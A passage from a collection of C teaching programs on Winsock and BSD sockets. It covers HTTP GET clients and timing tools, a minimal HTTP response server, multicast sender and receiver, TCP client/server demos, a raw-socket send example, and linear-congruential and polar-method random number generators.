  }

  // Wait for all threads to finish
  while(Count);

  // Output end message
  printf("End of httpget3.c \n");

  // This stuff cleans-up winsock
  WSACleanup();
}

//=  Thread function to do a get                                            =
void do_get(void *in_arg)
{
  unsigned int         server_s;             // Server socket descriptor
  struct sockaddr_in   server_addr;          // Server Internet address
  char                 out_buf[BUF_SIZE];    // Output buffer for GET request
  char                 in_buf[BUF_SIZE];     // Input buffer for response
  unsigned int         retcode;              // Return code
  unsigned int         i;                    // Loop counter

  // Create a socket
  server_s = socket(AF_INET, SOCK_STREAM, 0);

  // Fill-in the Web server socket's address information
  server_addr.sin_family = AF_INET;                 // Address family to use
  server_addr.sin_port = htons(PORT_NUM);           // Port num to use
  server_addr.sin_addr.s_addr = inet_addr(IP_ADDR); // IP address to use

  // Do a connect (connect() blocks)
  retcode = connect(server_s, (struct sockaddr *)&server_addr,
                    sizeof(server_addr));
  if (retcode != 0)
  {
    Count--;
    printf("ERROR - connect() failed \n");
    _endthread();
    exit(1);
  }

  // Send a GET to the Web server
  strcpy(out_buf, GET_STRING);
  send(server_s, out_buf, strlen(out_buf), 0);

  // Receive from the Web server
  //  - The return code from recv() is the number of bytes received
  retcode = recv(server_s, in_buf, BUF_SIZE, 0);
  while ((retcode > 0) || (retcode == -1))
  {
    if (retcode == -1)
    {
      Count--;
      printf("ERROR - recv() failed \n");
      _endthread();
      exit(1);
    }
    retcode = recv(server_s, in_buf, BUF_SIZE, 0);
  }

  // Decrement for a completed thread
  Count--;

  // Close all open sockets and end the thread
  closesocket(server_s);
  _endthread();
}

/*_______________ httpresp.c _______________*/

//=  A server program to respond to an HTTP GET from a Web browser            =
//=    1) This program conditionally compiles for Winsock and BSD sockets.    =
//=       Set the initial #define to WIN or BSD as appropriate.               =
//=    2) This program hardwires an HTML response message to return to        =
//=       the browser.                                                        =
//=  Example execution:                                                       =
//=                                                                           =
//=   1) Determine the IP address on which httpresp will run                  =
//=      (e.g., 131.247.167.109).  On Windows NT/2000 use ipconfig to         =
//=      determine the IP address of the local machine.                       =
//=   2) Execute httpresp                                                     =
//=   3) Open a Web browser and surf to http://xxx.xxx.xxx.xxx where          =
//=      xxx.xxx.xxx.xxx is the IP address determined in step (1)             =
//=   4) Will see a response message (with red "Wow!") on the browser screen  =
//=  Build: bcc32 httpresp.c, cl httpresp.c wsock32.lib,                      =
//=         gcc httpresp.c -lsocket -lnsl                                     =
//=  Execute: httpresp                                                        =
#define  WIN                // WIN for Winsock and BSD for BSD sockets

#include <stdio.h>          // Needed for printf()
#include <stdlib.h>         // Needed for exit()
#include <string.h>         // Needed for strcpy() and strlen()
#ifdef WIN
  #include <windows.h>      // Needed for all Winsock stuff
#endif
#ifdef BSD
  #include <sys/types.h>    // Needed for system defined identifiers.
  #include <netinet/in.h>   // Needed for internet address structure.
  #include <sys/socket.h>   // Needed for socket(), bind(), etc...
  #include <arpa/inet.h>    // Needed for inet_ntoa()
  #include <fcntl.h>
  #include <netdb.h>
#endif

#define  BUF_SIZE           10000     // Buffer size
#define  PORT_NUM              80     // This is the port number for a Web server

void main(void)
{
#ifdef WIN
  WORD wVersionRequested = MAKEWORD(1,1);       // Stuff for WSA functions
  WSADATA wsaData;                              // Stuff for WSA functions
#endif

  unsigned int         server_s;             // Server socket descriptor
  struct sockaddr_in   server_addr;          // Server Internet address
  unsigned int         client_s;             // Client socket descriptor
  struct sockaddr_in   client_addr;          // Client Internet address
  struct in_addr       client_ip_addr;       // Client IP address
  int                  addr_len;             // Internet address length
  char                 out_buf[BUF_SIZE];    // Output buffer for HTML response
  char                 in_buf[BUF_SIZE];     // Input buffer for GET resquest
  unsigned int         retcode;              // Return code
  unsigned int         i;                    // Loop counter

#ifdef WIN
  // This stuff initializes winsock
  WSAStartup(wVersionRequested, &wsaData);
#endif

  // Create a socket
  server_s = socket(AF_INET, SOCK_STREAM, 0);

  // Fill-in my socket's address information and bind the socket
  server_addr.sin_family = AF_INET;
  server_addr.sin_port = htons(PORT_NUM);
  server_addr.sin_addr.s_addr = htonl(INADDR_ANY);
  bind(server_s, (struct sockaddr *)&server_addr, sizeof(server_addr));

  // Listen for connections and then accept
  listen(server_s, 1);
  addr_len = sizeof(client_addr);
  client_s = accept(server_s, (struct sockaddr *)&client_addr, &addr_len);

  // Receive from the Web browser
  //  - The return code from recv() is the number of bytes received
  retcode = recv(client_s, in_buf, BUF_SIZE, 0);
  for (i=0; i<retcode; i++)
    printf ("%c", in_buf[i]);

  // Copy the HTML response into the out buffer
  strcpy(out_buf, "<html><body><hr>This is a response <b>message</b> in HTML  \
                   format. <font color=red>Wow!</font><hr></body></html>");

  // Send HTML response to the client
  send(client_s, out_buf, strlen(out_buf), 0);

  // Close all open sockets
#ifdef WIN
  closesocket(server_s);
  closesocket(client_s);
#endif
#ifdef BSD
  close(server_s);
  close(client_s);
#endif

#ifdef WIN
  // This stuff cleans-up winsock
  WSACleanup();
#endif
}

/*_______________ mcastclient.c _______________*/

//=  A multicast client to receive multicast datagrams                       =
//=    1) This program receives on a multicast address and outputs the       =
//=       received buffer to the screen.                                     =
//=    2) Conditionally compiles for Winsock and BSD sockets by setting the  =
//=       initial #define to WIN or BSD as appropriate.                      =
//=    3) The multicast group address is GROUP_ADDR.                         =
//=  Build: bcc32 mclient.c or cl mclient.c wsock32.lib for Winsock          =
//=         gcc mclient.c -lsocket -lnsl for BSD                             =
#define  WIN                // WIN for Winsock and BSD for BSD sockets

#include <stdio.h>          // Needed for printf()
#include <stdlib.h>         // Needed for memcpy()
#ifdef WIN
  #include <winsock.h>      // Needed for all Windows stuff
#endif
#ifdef BSD
  #include <sys/types.h>    // Needed for system defined identifiers.
  #include <netinet/in.h>   // Needed for internet address structure.
  #include <sys/socket.h>   // Needed for socket(), bind(), etc...
  #include <arpa/inet.h>    // Needed for inet_ntoa()
  #include <fcntl.h>
  #include <netdb.h>
#endif

#define PORT_NUM         4444             // Port number used
#define GROUP_ADDR "225.1.1.1"            // Address of the multicast group

void main(void)
{
#ifdef WIN
  WORD wVersionRequested = MAKEWORD(1,1); // Stuff for WSA functions
  WSADATA wsaData;                        // Stuff for WSA functions
#endif
  unsigned int         multi_server_sock; // Multicast socket descriptor
  struct ip_mreq       mreq;              // Multicast group structure
  struct sockaddr_in   client_addr;       // Client Internet address
  unsigned int         addr_len;          // Internet address length
  unsigned char        buffer[256];       // Datagram buffer
  int                  retcode;           // Return code

#ifdef WIN
  // This stuff initializes winsock
  WSAStartup(wVersionRequested, &wsaData);
#endif

  // Create a multicast socket and fill-in multicast address information
  multi_server_sock=socket(AF_INET, SOCK_DGRAM,0);
  mreq.imr_multiaddr.s_addr = inet_addr(GROUP_ADDR);
  mreq.imr_interface.s_addr = INADDR_ANY;

  // Create client address information and bind the multicast socket
  client_addr.sin_family = AF_INET;
  client_addr.sin_addr.s_addr = INADDR_ANY;
  client_addr.sin_port = htons(PORT_NUM);
  retcode = bind(multi_server_sock,(struct sockaddr *)&client_addr,
                 sizeof(struct sockaddr));
  if (retcode < 0)
  {
    printf("*** ERROR - bind() failed with retcode = %d \n", retcode);
    return;
  }

  // Have the multicast socket join the multicast group
  retcode = setsockopt(multi_server_sock, IPPROTO_IP, IP_ADD_MEMBERSHIP,
             (char*)&mreq, sizeof(mreq)) ;
  if (retcode < 0)
  {
    printf("*** ERROR - setsockopt() failed with retcode = %d \n", retcode);
    return;
  }

  // Set addr_len
  addr_len = sizeof(client_addr);

  while(1)
  {
    // Receive a datagram from the multicast server
    if( (retcode = recvfrom(multi_server_sock, buffer, sizeof(buffer), 0,
      (struct sockaddr *)&client_addr, &addr_len)) < 0){
        printf("*** ERROR - recvfrom() failed \n");
        exit(1);
      }

    // Output the received buffer to the screen as a string
    printf("%s\n",buffer);
  }

  // Close and clean-up
#ifdef WIN
  closesocket(multi_server_sock);
  WSACleanup();
#endif
#ifdef BSD
  close(multi_server_sock);
#endif
}

/*_______________ mcastserver.c _______________*/

//=  A multicast server to send multicast datagrams                          =
//=    1) This program sends datagrams one per second to a multicast group.  =
//=    2) Conditionally compiles for Winsock and BSD sockets by setting the  =
//=       initial #define to WIN or BSD as appropriate.                      =
//=    3) The multicast group address is GROUP_ADDR.                         =
//=  Build: bcc32 mserver.c or cl mserver.c wsock32.lib for Winsock          =
//=         gcc mserver.c -lsocket -lnsl for BSD                             =
#define  WIN                // WIN for Winsock and BSD for BSD sockets

#include <stdio.h>          // Needed for printf()
#include <stdlib.h>         // Needed for memcpy() and itoa()
#ifdef WIN
  #include <winsock.h>      // Needed for all Windows stuff
#endif
#ifdef BSD
  #include <sys/types.h>    // Needed for system defined identifiers.
  #include <netinet/in.h>   // Needed for internet address structure.
  #include <sys/socket.h>   // Needed for socket(), bind(), etc...
  #include <arpa/inet.h>    // Needed for inet_ntoa()
  #include <fcntl.h>
  #include <netdb.h>
#endif

#define PORT_NUM         4444             // Port number used
#define GROUP_ADDR "225.1.1.1"            // Address of the multicast group

void main(void)
{
#ifdef WIN
  WORD wVersionRequested = MAKEWORD(1,1);       // Stuff for WSA functions
  WSADATA wsaData;                              // Stuff for WSA functions
#endif
  unsigned int         server_s;                // Server socket descriptor
  unsigned int         multi_server_sock;       // Multicast socket descriptor
  struct sockaddr_in   addr_dest;               // Multicast group address
  struct ip_mreq       mreq;                    // Multicast group descriptor
  unsigned char        TTL;                     // TTL for multicast packets
  struct in_addr       recv_ip_addr;            // Receive IP address
  unsigned int         addr_len;                // Internet address length
  unsigned char        buffer[256];             // Datagram buffer
  int                  count;                   // Loop counter
  int                  retcode;                 // Return code

#ifdef WIN
  // This stuff initializes winsock
  WSAStartup(wVersionRequested, &wsaData);
#endif

  // Create a multicast socket
  multi_server_sock=socket(AF_INET, SOCK_DGRAM,0);

  // Create multicast group address information
  addr_dest.sin_family = AF_INET;
  addr_dest.sin_addr.s_addr = inet_addr(GROUP_ADDR);
  addr_dest.sin_port = htons(PORT_NUM);

  // Set the TTL for the sends using a setsockopt()
  TTL = 1;
  retcode = setsockopt(multi_server_sock, IPPROTO_IP, IP_MULTICAST_TTL,
                       (char *)&TTL, sizeof(TTL));
  if (retcode < 0)
  {
    printf("*** ERROR - setsockopt() failed with retcode = %d \n", retcode);
    return;
  }

  // Set addr_len
  addr_len = sizeof(addr_dest);

  // Multicast the message forever with a period of 1 second
  count = 0;
  printf("*** Sending multicast datagrams to '%s' (port = %d) \n",
    GROUP_ADDR, PORT_NUM);
  while(1)
  {
    // Increment loop count
    count++;

    // Build the message in the buffer
    sprintf(buffer,"Hello Multicast Group - this is message #%d", count);

    // Send buffer as a datagram to the multicast group
    sendto(multi_server_sock, buffer, sizeof(buffer), 0,
           (struct sockaddr*)&addr_dest, addr_len);
#ifdef WIN
    Sleep(1000);
#endif
#ifdef BSD
    sleep(1);
#endif
  }

  // Close and clean-up
#ifdef WIN
  closesocket(multi_server_sock);
  WSACleanup();
#endif
#ifdef BSD
  close(multi_server_sock);
#endif
}

/*_______________ randnormal.c _______________*/

//=  Random number generator for normal(0, 1)                               =
//=    1) This program is a "driver program" for the function normal().     =
//=       See the header of normal() for a full description.                =
//=    2) The function normal() uses the polar method to generate           =
//=       normal(0, 1) from uniform(0, 1).                                  =
//=    3) Can generate X' = Normal(mean, sigma^2) by setting                =
//=       X' = mean + sigma * Normal(0, 1)                                  =
//=    4) Compile will generate a warning something like,                   =
//=        - Warning X.C 90: 'X2' is assigned a value that is never used    =
//=          in function normal                                             =
//= Example output:                                                         =
//=                                                                         =
//=   ------------------------------------------------ normal.c -----       =
//=   1.601592                                                              =
//=   0.174768                                                              =
//=   -0.302023                                                             =
//=                                                                         =
//=   <SNIP SNIP>                                                           =
//=                                                                         =
//=   -0.859291                                                             =
//=   0.494700                                                              =
//=   1.403386                                                              =
//=   ---------------------------------------------------------------       =
//=  Build: gcc normal.c, bcc32 normal.c, cl normal.c                       =
//=  Execute: normal                                                        =

#include <stdio.h>          // Needed for printf()
#include <math.h>           // Needed for log() and sqrt()

double normal(void);        // Function to generate normal(0, 1)
double rand_val(void);      // Function to generate uniform(0, 1)

//=  Main program                                                           =
void main(void)
{
  long i;      // Loop counter

  // Output a banner
  printf("------------------------------------------------ normal.c -----\n");

  // Output 10000 random values between 0.0 and 1.0
  for (i=0; i<10000; i++)
    printf("%f \n", normal());

  // Output a tailer
  printf("---------------------------------------------------------------\n");
}

//= Generate a normal(0, 1) using the polar method as described in        =
//= A. Law and W. Kelton, "Simulation Modeling and Analysis," McGraw      =
//= Hill, 1991 (Page 491).                                                =
//=   - Uses rand_val() (see unif.c for description of rand_val())        =
//=   - Computes a pair of normal(0, 1) per the polar method, but         =
//=     returns only the first value generated                            =
double normal(void)
{
  double V1, V2, W, Y;         // V1, V2, W, and Y variables for polar method
  double X1, X2;               // X1 and X2 variables for polar method

  // Step #1 from Law and Kelton (Page 491)
  do
  {
    V1 = 2.0 * rand_val() - 1.0;
    V2 = 2.0 * rand_val() - 1.0;
    W = (V1 * V1) + (V2 * V2);
  }
  while (W > 1.0);

  // Step #2 from Law and Kelton (Page 491)
  //  - Cannot easily return two values, so X2 is never used
  Y = sqrt((-2 * log(W)) / W);
  X1 = V1 * Y;
  X2 = V2 * Y;

  return(X1);
}

//= Multiplicative LCG for generating uniform(0.0, 1.0) random numbers    =
//=   - x_n = 7^5*x_(n-1)mod(2^31 - 1)                                    =
//=   - With x seeded to 1 the 10000th x value should be 1043618065       =
//=   - From R. Jain, "The Art of Computer Systems Performance Analysis," =
//=     John Wiley & Sons, 1991. (Page 443, Figure 26.2)                  =
double rand_val(void)
{
  const long  a =      16807;  // Multiplier
  const long  m = 2147483647;  // Modulus
  const long  q =     127773;  // m div a
  const long  r =       2836;  // m mod a
  static long x = 1;           // Random int value (seed is set to 1)
  long        x_div_q;         // x divided by q
  long        x_mod_q;         // x modulo q
  long        x_new;           // New x value

  // RNG using integer arithmetic
  x_div_q = x / q;
  x_mod_q = x % q;
  x_new = (a * x_mod_q) - (r * x_div_q);
  if (x_new > 0)
    x = x_new;
  else
    x = x_new + m;

  // Return a random value between 0.0 and 1.0
  return((double) x / m);
}

/*_______________ randunif.c _______________*/

//=  Random number generator for uniform(0.0, 1.0)                          =
//=    1) This program is a "driver program" for the function rand_val().   =
//=       See the header of rand_val() for a full description.              =
//=    2) The function rand_val() is better than a z = rand() / RAND_MAX    =
//=       approach which is limited to 32767 different values.              =
//= Example output:                                                         =
//=                                                                         =
//=   -------------------------------------------------- unif.c -----       =
//=   0.000008                                                              =
//=   0.131538                                                              =
//=   0.755605                                                              =
//=                                                                         =
//=   <SNIP SNIP>                                                           =
//=                                                                         =
//=   0.430814                                                              =
//=   0.691408                                                              =
//=   0.485973                                                              =
//=   ---------------------------------------------------------------       =
//=  Build: gcc unif.c, bcc32 unif.c, cl unif.c                             =
//=  Execute: unif                                                          =

#include <stdio.h>          // Needed for printf()

double rand_val(void);      // Function to generate uniform(0, 1)

//=  Main program                                                           =
void main(void)
{
  long i;      // Loop counter

  // Output a banner
  printf("-------------------------------------------------- unif.c -----\n");

  // Output 10000 random values between 0.0 and 1.0
  for (i=0; i<10000; i++)
    printf("%f \n", rand_val());

  // Output a tailer
  printf("---------------------------------------------------------------\n");
}

//= Multiplicative LCG for generating uniform(0.0, 1.0) random numbers    =
//=   - x_n = 7^5*x_(n-1)mod(2^31 - 1)                                    =
//=   - With x seeded to 1 the 10000th x value should be 1043618065       =
//=   - From R. Jain, "The Art of Computer Systems Performance Analysis," =
//=     John Wiley & Sons, 1991. (Page 443, Figure 26.2)                  =
double rand_val(void)
{
  const long  a =      16807;  // Multiplier
  const long  m = 2147483647;  // Modulus
  const long  q =     127773;  // m div a
  const long  r =       2836;  // m mod a
  static long x = 1;           // Random int value (seed is set to 1)
  long        x_div_q;         // x divided by q
  long        x_mod_q;         // x modulo q
  long        x_new;           // New x value

  // RNG using integer arithmetic
  x_div_q = x / q;
  x_mod_q = x % q;
  x_new = (a * x_mod_q) - (r * x_div_q);
  if (x_new > 0)
    x = x_new;
  else
    x = x_new + m;

  // Return a random value between 0.0 and 1.0
  return((double) x / m);
}

/*_______________ rawsocksend.c _______________*/

//=  Program to demonstrate raw sockets for sending                           =
//=    - Appends message bytes directly following IP header                   =
//=    1) This program compiles for Winsock only                              =
//=    2) There is *no* error checking in this program.  Error checking was   =
//=       omitted to simplify the program.                                    =
//=    3) This program assumes that the destination host has its IP address   =
//=       hardcoded into "#define IP_ADDR"                                    =
//=  Build: bcc32 rawsend.c ws2_32.lib                                        =
#include <stdio.h>               // Needed for printf()
#include <string.h>              // Needed for memcpy() and strcpy()
#include <winsock2.h>            // Winsock version 2 stuff

#define  IP_ADDR "131.247.2.215" // IP address of destination (HARDWIRED)

void main(void)
{
  WORD wVersionRequested = MAKEWORD(1,1); // Stuff for WSA functions
  WSADATA wsaData;                        // Stuff for WSA functions
  unsigned int         dest_s;            // Destination socket descriptor
  struct sockaddr_in   dest_addr;         // Destination Internet address
  int                  mess_len;          // Message length
  char                 mess_buf[1024];    // 1024-byte buffer for message
  int                  i;                 // Loop counter

  // Initialize Winsock
  WSAStartup(wVersionRequested, &wsaData);

  // Create raw socket for destination
  dest_s = WSASocket(AF_INET, SOCK_RAW, IPPROTO_ICMP, 0, 0, 0);

  // Fill-in destination socket's address information
  dest_addr.sin_family      = AF_INET;            // Address family to use
  dest_addr.sin_addr.s_addr = inet_addr(IP_ADDR); // IP address to use

  // Assign message bytes to out_buf
  mess_len = 100;
  for (i=0; i<mess_len; i++)
    mess_buf[i] = i;

  // Now send the message to the destination
  sendto(dest_s, mess_buf, mess_len, 0,
         (struct sockaddr *)&dest_addr, sizeof(dest_addr));

  // Close destination socket
  closesocket(dest_s);

  // Clean-up Winsock
  WSACleanup();
}

/*_______________ tcpclient.c _______________*/

//=  A message "client" program to demonstrate sockets programming            =
//=   - TCP/IP client/server model is implemented                             =
//=    1) This program conditionally compiles for Winsock and BSD sockets.    =
//=       Set the initial #define to WIN or BSD as appropriate.               =
//=    2) There is *no* error checking in this program.  Error checking was   =
//=       omitted to simplify the program.                                    =
//=    3) This program needs server to be running on another host.  Program   =
//=       server should be started first.                                     =
//=    4) This program assumes that the server has the IP address hardcoded   =
//=       into "#define IP_ADDR"                                              =
//=    5) The steps #'s correspond to lecture topics.                         =
//=  Build: bcc32 client.c or cl client.c wsock32.lib for Winsock             =
//=         gcc client.c -lsocket -lnsl for BSD                               =
//=            KJC (02/08/00) - Added client-to-server send                   =
//=            KJC (05/20/03) - Updated socket naming to match Kurose et al.  =
#define  WIN                // WIN for Winsock and BSD for BSD sockets

#include <stdio.h>          // Needed for printf()
#include <string.h>         // Needed for memcpy() and strcpy()
#ifdef WIN
  #include <windows.h>      // Needed for all Winsock stuff
#endif
#ifdef BSD
  #include <sys/types.h>    // Needed for system defined identifiers.
  #include <netinet/in.h>   // Needed for internet address structure.
  #include <sys/socket.h>   // Needed for socket(), bind(), etc...
  #include <arpa/inet.h>    // Needed for inet_ntoa()
  #include <fcntl.h>        // Needed for sockets stuff
  #include <netdb.h>        // Needed for sockets stuff
#endif

#define  PORT_NUM         1050     // Port number used at the server
#define  IP_ADDR "131.247.166.56"  // IP address of server (*** HARDWIRED ***)

void main(void)
{
#ifdef WIN
  WORD wVersionRequested = MAKEWORD(1,1);       // Stuff for WSA functions
  WSADATA wsaData;                              // Stuff for WSA functions
#endif

  unsigned int         client_s;        // Server socket descriptor
  struct sockaddr_in   server_addr;     // Server Internet address
  char                 out_buf[100];    // 100-byte output buffer for data
  char                 in_buf[100];     // 100-byte input buffer for data

#ifdef WIN
  // This stuff initializes winsock
  WSAStartup(wVersionRequested, &wsaData);
#endif

  // >>> Step #1 <<<
  // Create a client socket
  //   - AF_INET is Address Family Internet and SOCK_STREAM is streams
  client_s = socket(AF_INET, SOCK_STREAM, 0);

  // >>> Step #2 <<<
  // Fill-in the client socket's address information and do a connect with
  // the listening server.  The connect() will block.
  server_addr.sin_family      = AF_INET;            // Address family to use
  server_addr.sin_port        = htons(PORT_NUM);    // Port num to use
  server_addr.sin_addr.s_addr = inet_addr(IP_ADDR); // IP address to use
  connect(client_s, (struct sockaddr *)&server_addr, sizeof(server_addr));

  // >>> Step #3 <<<
  // Receive from the server
  recv(client_s, in_buf, sizeof(in_buf), 0);
  printf("Received from server... data = '%s' \n", in_buf);

  // >>> Step #4 <<<
  // Send to the server
  strcpy(out_buf, "Test message from client to server");
  send(client_s, out_buf, (strlen(out_buf) + 1), 0);

  // >>> Step #5 <<<
  // Close all open sockets
#ifdef WIN
  closesocket(client_s);
#endif
#ifdef BSD
  close(client_s);
#endif

#ifdef WIN
  // This stuff cleans-up winsock
  WSACleanup();
#endif
}

/*_______________ tcpserver.c _______________*/

//=  A message "server" program to demonstrate sockets programming            =
//=   - TCP/IP client/server model is implemented                             =
//=    1) This program conditionally compiles for Winsock and BSD sockets.    =
//=       Set the initial #define to WIN or BSD as appropriate.               =
//=    2) There is *no* error checking in this program.  Error checking was   =
//=       omitted to simplify the program.                                    =
//=    3) This program serves a message to program client running on another  =
//=       host.                                                               =
//=    4) The steps #'s correspond to lecture topics.                         =
//=  Build: bcc32 server.c or cl server.c wsock32.lib for Winsock             =
//=         gcc server.c -lsocket -lnsl for BSD                               =
//=            KJC (02/08/00) - Added client-to-server recv                   =
//=            KJC (05/20/03) - Updated socket naming to match Kurose et al.  =
#define  WIN                // WIN for Winsock and BSD for BSD sockets

#include <stdio.h>          // Needed for printf()
#include <string.h>         // Needed for memcpy() and strcpy()
#ifdef WIN
  #include <windows.h>      // Needed for all Winsock stuff
#endif
#ifdef BSD
  #include <sys/types.h>    // Needed for system defined identifiers.
  #include <netinet/in.h>   // Needed for internet address structure.
  #include <sys/socket.h>   // Needed for socket(), bind(), etc...
  #include <arpa/inet.h>    // Needed for inet_ntoa()
  #include <fcntl.h>        // Needed for sockets stuff
  #include <netdb.h>        // Needed for sockets stuff
#endif

#define  PORT_NUM   1050    // Arbitrary port number for the server

void main(void)
{
#ifdef WIN
  WORD wVersionRequested = MAKEWORD(1,1);       // Stuff for WSA functions
  WSADATA wsaData;                              // Stuff for WSA functions
#endif

  unsigned int         server_s;        // Server socket descriptor
  struct sockaddr_in   server_addr;     // Server Internet address
  unsigned int         connect_s;       // Connection socket descriptor
  struct sockaddr_in   client_addr;     // Client Internet address
  struct in_addr       client_ip_addr;  // Client IP address
  int                  addr_len;        // Internet address length
  char                 out_buf[100];    // 100-byte output buffer for data
  char                 in_buf[100];     // 100-byte input buffer for data

#ifdef WIN
  // This stuff initializes winsock
  WSAStartup(wVersionRequested, &wsaData);
#endif

  // >>> Step #1 <<<
  // Create a socket
  //   - AF_INET is Address Family Internet and SOCK_STREAM is streams
  server_s = socket(AF_INET, SOCK_STREAM, 0);

  // >>> Step #2 <<<
  // Fill-in my socket's address information and bind the socket
  //   - See winsock.h for a description of struct sockaddr_in
  server_addr.sin_family      = AF_INET;            // Address family to use
  server_addr.sin_port        = htons(PORT_NUM);    // Port number to use
  server_addr.sin_addr.s_addr = htonl(INADDR_ANY);  // Listen on any IP address
  bind(server_s, (struct sockaddr *)&server_addr, sizeof(server_addr));

  // >>> Step #3 <<<
  // Listen on server socket for a connection
  listen(server_s, 1);

  // >>> Step #4 <<<
  // Accept a connection.  The accept() will block and then return with
  // connect_s assigned and client_addr filled-in.
  addr_len = sizeof(client_addr);
  connect_s = accept(server_s, (struct sockaddr *)&client_addr, &addr_len);

  // Copy the four-byte client IP address into an IP address structure
  //   - See winsock.h for a description of struct in_addr
  memcpy(&client_ip_addr, &client_addr.sin_addr.s_addr, 4);

  // Print an informational message that accept completed
  printf("Accept completed!!!  IP address of client = %s  port = %d \n",
    inet_ntoa(client_ip_addr), ntohs(client_addr.sin_port));

  // >>> Step #5 <<<
  // Send to the client
  strcpy(out_buf, "Test message from server to client");
  send(connect_s, out_buf, (strlen(out_buf) + 1), 0);

  // >>> Step #6 <<<
  // Receive from the client
  recv(connect_s, in_buf, sizeof(in_buf), 0);
  printf("Received from client... data = '%s' \n", in_buf);

  // >>> Step #7 <<<
  // Close all open sockets
#ifdef WIN
  closesocket(server_s);
  closesocket(connect_s);
#endif
#ifdef BSD
  close(server_s);
  close(connect_s);
#endif

#ifdef WIN
  // This stuff cleans-up winsock
  WSACleanup();
#endif
}

/*_______________ timehttpget1.c _______________*/

//=  A client program to do serial GETs from a Web server                     =
//=   - Times the GET response                                                =
//=    1) This program is for Winsock only.                                   =
//=    2) This program hardwires the IP address into IP_ADDR and hardwires    =
//=       the GET request string into GET_STRING.                             =
//=    3) NUM_GET is the number of serial GETs to do                          =
//=  Output from an execution:                                                =
//=                                                                           =
//=   --------------------------------------------- timeget1.c -----          =
//=     Number of serial GETs = 10                                            =
//=     Target IP address     = 131.247.2.15                                  =
//=     GET string            = GET /1m.dat HTTP/1.0                          =
//=                                                                           =
//=                                                                           =
//=     Elapsed time          = 2297.000 millisec                             =
//=   ---------------------------------------------------------------         =
//=  Build: bcc32 timeget1.c                                                  =
//=  Execute: timeget1                                                        =

#include <stdio.h>          // Needed for printf()
#include <stdlib.h>         // Needed for exit()
#include <string.h>         // Needed for strcpy() and strlen()
#include <windows.h>        // Needed for all Winsock stuff
#include <sys\timeb.h>      // Needed for ftime() and timeb structure

#define  BUF_SIZE            4096     // Buffer size
#define  PORT_NUM              80     // Web servers are at port 80
#define  IP_ADDR    "131.247.2.16"    // IP address of web server
#define  GET_STRING "GET /1m.dat HTTP/1.0\n\n"  // GET string
#define  NUM_GET              100      // Number of GETs to do

void main(void)
{
  WORD                 wVersionRequested = MAKEWORD(1,1);    // WSA stuff
  WSADATA              wsaData;              // WSA stuff
  unsigned int         server_s;             // Server socket descriptor
  struct sockaddr_in   server_addr;          // Server Internet address
  char                 out_buf[BUF_SIZE];    // Output buffer for GET request
  char                 in_buf[BUF_SIZE];     // Input buffer for response
  struct               timeb start, stop;    // Start and stop times structures
  double               elapsed;              // Elapsed time in seconds
  int                  retcode;              // Return code
  int                  i, j;                 // Loop counter

  // This stuff initializes winsock
  WSAStartup(wVersionRequested, &wsaData);

  // Output a banner
  printf("--------------------------------------------- timeget1.c -----\n");
  printf("  Number of serial GETs = %d \n", NUM_GET);
  printf("  Target IP address     = %s \n", IP_ADDR);
  printf("  GET string            = %s \n", GET_STRING);

  // Start timing
  ftime(&start);

  for (i=0; i<NUM_GET; i++)
  {
    // Create a socket
    server_s = socket(AF_INET, SOCK_STREAM, 0);
    if (server_s < 0)
    {
      printf("*** ERROR - socket() failed (%d) \n", WSAGetLastError());
      exit(1);
    }

    // Fill-in the Web server socket's address information
    server_addr.sin_family = AF_INET;                 // Address family to use
    server_addr.sin_port = htons(PORT_NUM);           // Port num to use
    server_addr.sin_addr.s_addr = inet_addr(IP_ADDR); // IP address to use

    // Do a connect (connect() blocks)
    retcode = connect(server_s, (struct sockaddr *)&server_addr,
                      sizeof(server_addr));
    if (retcode != 0)
    {
      printf("*** ERROR - connect() failed (%d) \n", WSAGetLastError());
      exit(1);
    }

    // Send a GET to the Web server
    strcpy(out_buf, GET_STRING);
    send(server_s, out_buf, strlen(out_buf), 0);

    // Receive from the Web server
    //  - The return code from recv() is the number of bytes received
    retcode = recv(server_s, in_buf, BUF_SIZE, 0);
    while ((retcode > 0) || (retcode == -1))
    {
      if (retcode == -1)
      {
        printf("*** ERROR - recv() failed (%d) \n", WSAGetLastError());
        exit(1);
      }
      retcode = recv(server_s, in_buf, BUF_SIZE, 0);
    }

    // Close socket
    closesocket(server_s);
  }

  // Stop timing and compute elapsed time
  ftime(&stop);
  elapsed=((double) stop.time + ((double) stop.millitm * 0.001)) -
          ((double) start.time + ((double) start.millitm * 0.001));

  // Output elapsed time
  printf("  Elapsed time          = %7.3f millisec \n", 1000.0 * elapsed);
  printf("---------------------------------------------------------------\n");

  // Clean-up WSA stuff
  WSACleanup();
}

/*_______________ timehttpget2.c _______________*/

//=  A client program to do threaded GETs from a Web server                   =
//=   - Times the GET response                                                =
//=    1) This program is for Winsock only.                                   =
//=    2) This program hardwires the IP address into IP_ADDR and hardwires    =
//=       the GET request string into GET_STRING.                             =
//=    3) NUM_GET is the number of serial GETs to do                          =
//=  Output from an execution:                                                =
//=                                                                           =
//=   --------------------------------------------- timeget2.c -----          =
//=     Number of parallel GETs = 100                                         =
//=     Target IP address       = 131.247.2.16                                =
//=     GET string              = GET /1m.dat HTTP/1.0                        =
//=                                                                           =
//=                                                                           =
//=     Elapsed time            = 4406.000 millisec                           =
//=   ---------------------------------------------------------------         =
//=  Build: bcc32 timeget2.c                                                  =
//=  Execute: timeget2                                                        =

#include <stdio.h>          // Needed for printf()
#include <stdlib.h>         // Needed for exit()
#include <string.h>         // Needed for strcpy() and strlen()
#include <windows.h>        // Needed for all Winsock stuff
#include <sys\timeb.h>      // Needed for ftime() and timeb structure
#include <process.h>        // Needed for _beginthread() and _endthread()

#define  BUF_SIZE            4096     // Buffer size
#define  PORT_NUM              80     // Web servers are at port 80
#define  IP_ADDR    "131.247.2.16"    // IP address of web server
#define  GET_STRING "GET /1m.dat HTTP/1.0\n\n"  // GET string
#define  NUM_GET              100     // Number of GETs to do

int Count;                            // Global thread counter
int Num;                              // Number of threads completed

void do_get(void *in_arg);            // Thread function to do a GET

void main(void)
{
  WORD wVersionRequested = MAKEWORD(1,1);    // Stuff for WSA functions
  WSADATA wsaData;                           // Stuff for WSA functions
  struct               timeb start, stop;    // Start and stop times structures
  double               elapsed;              // Elapsed time in seconds
  int                  retcode;              // Return code
  int                  i;                    // Loop counter

  // This stuff initializes winsock
  WSAStartup(wVersionRequested, &wsaData);

  // Output a banner
  printf("--------------------------------------------- timeget2.c -----\n");
  printf("  Number of parallel GETs = %d \n", NUM_GET);
  printf("  Target IP address       = %s \n", IP_ADDR);
